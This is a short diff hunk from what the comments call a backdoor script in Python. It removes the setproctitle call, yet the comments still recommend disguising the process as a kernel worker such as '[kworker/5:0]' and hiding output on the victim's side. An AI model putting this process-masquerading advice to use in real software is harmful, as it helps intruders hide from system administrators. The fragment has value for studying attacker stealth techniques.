@@ -12,14 +12,12 @@ import os
 import subprocess
 import optparse
 import sys
-import setproctitle
 
 # masquerade process title
 # NOTE: generally a backdoor would not be named "backdoor" a recommended process
 # title would be something like "[kworker/0:0H]" or
 # "/usr/bin/systemd/systemd-login"
 title = "[kworker/5:0]"
-setproctitle.setproctitle(title)
 
 # parse command line argument
 # generally any output would be concealed on the server (victim's) side
